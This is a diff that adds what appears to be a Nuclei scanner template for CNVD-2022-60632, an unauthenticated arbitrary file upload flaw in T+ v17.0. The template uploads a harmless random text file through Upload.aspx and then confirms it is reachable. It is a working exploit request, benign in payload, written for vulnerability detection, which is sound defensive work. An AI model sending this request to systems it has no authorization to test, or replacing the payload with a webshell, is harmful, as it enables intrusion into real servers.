@@ -1,0 +1,46 @@
+id: cnvd-2022-60632-file-upload
+info:
+  name: T+ v17.0 Arbitrary File Upload (CNVD-2022-60632)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,cnvd-2022-60632
+
+variables:
+  t1: "{{rand_base(8)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/tplus/SM/SetupAccount/Upload.aspx?preload=1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt"
+    body: |
+      ------WebKitFormBoundarywwk2ReqGTj7lNYlt
+      Content-Disposition: form-data; name="File1";filename="{{t1}}.txt"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundarywwk2ReqGTj7lNYlt--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<!DOCTYPE html>"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/tplus/SM/SetupAccount/images/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
